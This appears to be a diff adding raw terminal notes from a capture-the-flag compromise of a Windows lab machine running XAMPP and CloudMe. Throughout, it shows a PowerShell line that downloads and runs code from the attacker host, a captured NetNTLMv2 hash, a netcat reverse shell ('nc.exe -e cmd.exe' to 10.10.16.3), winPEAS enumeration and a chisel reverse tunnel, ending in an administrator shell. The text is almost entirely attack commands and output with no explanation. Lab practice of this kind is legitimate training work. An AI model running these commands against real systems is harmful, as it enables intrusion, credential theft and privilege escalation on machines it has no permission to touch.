@@ -1,0 +1,200 @@
+└─$ nmap -p- -sSCV 10.10.10.198 --min-rate 999 
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-28 23:00 EDT
+Stats: 0:03:07 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
+Service scan Timing: About 50.00% done; ETC: 23:04 (0:00:40 remaining)
+Nmap scan report for 10.10.10.198
+Host is up (0.25s latency).
+Not shown: 65533 filtered tcp ports (no-response)
+PORT     STATE SERVICE    VERSION
+7680/tcp open  pando-pub?
+8080/tcp open  http       Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6)
+|_http-server-header: Apache/2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.4.6
+|_http-open-proxy: Proxy might be redirecting requests
+|_http-title: mrb3n's Bro Hut
+
+
+powershell.exe iex (New-Object Net.Webclient).DownloadString('http://10.10.16.3/winPEASx64.exe')
+
+
+└─$ impacket-smbserver share . -smb2support
+Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Config file parsed
+[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+[*] Config file parsed
+[*] Config file parsed
+[*] Incoming connection (10.10.10.198,49931)
+[*] AUTHENTICATE_MESSAGE (BUFF\shaun,BUFF)
+[*] User BUFF\shaun authenticated successfully
+[*] shaun::BUFF:aaaaaaaaaaaaaaaa:9bb27ce7d2152d7d0d3cf7489bb06109:0101000000000000000bffe11331dc015676a4e4eb1deddc000000000100100079005900420061005500490056006e000300100079005900420061005500490056006e00020010007800670065004e0072005a0045005800040010007800670065004e0072005a004500580007000800000bffe11331dc0106000400020000000800300030000000000000000000000000200000762cb0bc8aa7d4d94dc6a725bf6a3c1a1987aebd3f907e32eeb008263ce3b9750a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e00310030002e00310036002e0033000000000000000000
+[*] Connecting Share(1:IPC$)
+[*] Connecting Share(2:share)
+[*] Disconnecting Share(1:IPC$)
+[*] Disconnecting Share(2:share)
+[*] Closing down connection (10.10.10.198,49931)
+[*] Remaining connections []
+
+C:\xampp\htdocs\gym\upload> net use \\10.10.16.3\     
+�PNG
+�
+
+C:\xampp\htdocs\gym\upload> copy \\10.10.16.3\share\nc64.exe \programdata\nc.exe
+�PNG
+�
+        1 file(s) copied.
+
+C:\xampp\htdocs\gym\upload> dir \programdata\
+�PNG
+�
+ Volume in drive C has no label.
+ Volume Serial Number is A22D-49F7
+
+ Directory of C:\programdata
+
+16/06/2020  15:10    <DIR>          Microsoft OneDrive
+13/09/2025  16:22            45,272 nc.exe
+16/06/2020  15:14    <DIR>          Package Cache
+14/07/2020  13:17    <DIR>          Packages
+29/09/2025  08:07    <DIR>          regid.1991-06.com.microsoft
+12/04/2018  00:38    <DIR>          SoftwareDistribution
+16/06/2020  15:09    <DIR>          USOPrivate
+16/06/2020  15:09    <DIR>          USOShared
+16/06/2020  15:14    <DIR>          VMware
+12/04/2018  10:21    <DIR>          WindowsHolographicDevices
+               1 File(s)         45,272 bytes
+               9 Dir(s)   9,796,616,192 bytes free
+
+ \programdata\nc.exe -e cmd.exe 10.10.16.3 8821
+
+└─$ nc -nvlp 8821                              
+listening on [any] 8821 ...
+connect to [10.10.16.3] from (UNKNOWN) [10.10.10.198] 49933
+Microsoft Windows [Version 10.0.17134.1610]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\xampp\htdocs\gym\upload>whoami
+whoami
+buff\shaun
+
+
+C:\Users\shaun\Desktop>net use \\10.10.16.3\share
+net use \\10.10.16.3\share
+The command completed successfully.
+
+
+C:\Users\shaun\Desktop>copy \\10.10.16.3\share\winPEASx64.exe w.exe
+copy \\10.10.16.3\share\winPEASx64.exe w.exe
+        1 file(s) copied.
+
+
+
+����������͹ Current TCP Listening Ports
+� Check for services restricted from the outside 
+  Enumerating IPv4 connections
+
+  Protocol   Local Address         Local Port    Remote Address        Remote Port     State             Process ID      Process Name
+
+  TCP        0.0.0.0               135           0.0.0.0               0               Listening         944             svchost
+  TCP        0.0.0.0               445           0.0.0.0               0               Listening         4               System
+  TCP        0.0.0.0               5040          0.0.0.0               0               Listening         6416            svchost
+  TCP        0.0.0.0               7680          0.0.0.0               0               Listening         8896            svchost
+  TCP        0.0.0.0               8080          0.0.0.0               0               Listening         9180            C:\xampp\apache\bin\httpd.exe
+  TCP        0.0.0.0               49664         0.0.0.0               0               Listening         520             wininit
+  TCP        0.0.0.0               49665         0.0.0.0               0               Listening         1052            svchost
+  TCP        0.0.0.0               49666         0.0.0.0               0               Listening         1472            svchost
+  TCP        0.0.0.0               49667         0.0.0.0               0               Listening         2208            spoolsv
+  TCP        0.0.0.0               49668         0.0.0.0               0               Listening         668             services
+  TCP        0.0.0.0               49669         0.0.0.0               0               Listening         684             lsass
+  TCP        10.10.10.198          139           0.0.0.0               0               Listening         4               System
+  TCP        10.10.10.198          8080          10.10.16.3            39038           Established       9180            C:\xampp\apache\bin\httpd.exe
+  TCP        10.10.10.198          49933         10.10.16.3            8821            Established       6668            C:\programdata\nc.exe
+  TCP        10.10.10.198          49936         10.10.16.3            445             Established       4               System
+  TCP        127.0.0.1             3306          0.0.0.0               0               Listening         9208            C:\xampp\mysql\bin\mysqld.exe
+  TCP        127.0.0.1             8888          0.0.0.0               0               Listening         5084            CloudMe
+
+
+\\or 
+C:\Users\shaun\Desktop>netstat -ano | findstr TCP | findstr ":0"
+netstat -ano | findstr TCP | findstr ":0"
+  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       944
+  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4
+  TCP    0.0.0.0:5040           0.0.0.0:0              LISTENING       6416
+  TCP    0.0.0.0:7680           0.0.0.0:0              LISTENING       8896
+  TCP    0.0.0.0:8080           0.0.0.0:0              LISTENING       9180
+  TCP    0.0.0.0:49664          0.0.0.0:0              LISTENING       520
+  TCP    0.0.0.0:49665          0.0.0.0:0              LISTENING       1052
+  TCP    0.0.0.0:49666          0.0.0.0:0              LISTENING       1472
+  TCP    0.0.0.0:49667          0.0.0.0:0              LISTENING       2208
+  TCP    0.0.0.0:49668          0.0.0.0:0              LISTENING       668
+  TCP    0.0.0.0:49669          0.0.0.0:0              LISTENING       684
+  TCP    10.10.10.198:139       0.0.0.0:0              LISTENING       4
+  TCP    127.0.0.1:3306         0.0.0.0:0              LISTENING       9208
+  TCP    [::]:135               [::]:0                 LISTENING       944
+  TCP    [::]:445               [::]:0                 LISTENING       4
+  TCP    [::]:7680              [::]:0                 LISTENING       8896
+  TCP    [::]:8080              [::]:0                 LISTENING       9180
+  TCP    [::]:49664             [::]:0                 LISTENING       520
+  TCP    [::]:49665             [::]:0                 LISTENING       1052
+  TCP    [::]:49666             [::]:0                 LISTENING       1472
+  TCP    [::]:49667             [::]:0                 LISTENING       2208
+  TCP    [::]:49668             [::]:0                 LISTENING       668
+  TCP    [::]:49669             [::]:0                 LISTENING       684
+
+C:\Users\shaun>cd Downloads
+cd Downloads
+
+C:\Users\shaun\Downloads>dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is A22D-49F7
+
+ Directory of C:\Users\shaun\Downloads
+
+14/07/2020  13:27    <DIR>          .
+14/07/2020  13:27    <DIR>          ..
+16/06/2020  16:26        17,830,824 CloudMe_1112.exe
+
+
+└─$ chisel server -p 8800 --reverse
+2025/09/29 04:45:23 server: Reverse tunnelling enabled
+2025/09/29 04:45:23 server: Fingerprint d+TYxo6ROuUSnEnlQPeZhvlJ2+aRIz1seYlUOchNySo=
+2025/09/29 04:45:23 server: Listening on http://0.0.0.0:8800
+2025/09/29 04:46:10 server: session#1: Client version (1.11.3) differs from server version (1.10.1-0kali1)
+2025/09/29 04:46:10 server: session#1: tun: proxy#R:8888=>localhost:8888: Listening
+
+C:\Users\shaun\Downloads>copy \\10.10.16.3\share\chisel64.exe c.exe
+copy \\10.10.16.3\share\chisel64.exe c.exe
+        1 file(s) copied.
+
+C:\Users\shaun\Downloads>c.exe client 10.10.16.3:8800 R:8888:localhost:8888
+c.exe client 10.10.16.3:8800 R:8888:localhost:8888
+2025/09/29 09:19:25 client: Connecting to ws://10.10.16.3:8800
+2025/09/29 09:19:27 client: Connected (Latency 266.1782ms)
+
+└─$ netstat -ntlp
+(Not all processes could be identified, non-owned process info
+ will not be shown, you would have to be root to see it all.)
+Active Internet connections (only servers)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
+tcp        0      0 0.0.0.0:445             0.0.0.0:*               LISTEN      96335/python3       
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.1:50789         0.0.0.0:*               LISTEN      96335/python3       
+tcp        0      0 127.0.0.1:60645         0.0.0.0:*               LISTEN      96335/python3       
+tcp6       0      0 127.0.0.1:45827         :::*                    LISTEN      18842/java          
+tcp6       0      0 :::22                   :::*                    LISTEN      -                   
+tcp6       0      0 :::8800                 :::*                    LISTEN      124126/chisel       
+tcp6       0      0 :::8888                 :::*                    LISTEN      124126/chisel       
+tcp6       0      0 127.0.0.1:8080          :::*                    LISTEN      18842/java 
+
+
+
+└─$ nc -nvlp 8822
+listening on [any] 8822 ...
+connect to [10.10.16.3] from (UNKNOWN) [10.10.10.198] 49686
+Microsoft Windows [Version 10.0.17134.1610]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>whoami
+whoami
+buff\administrator
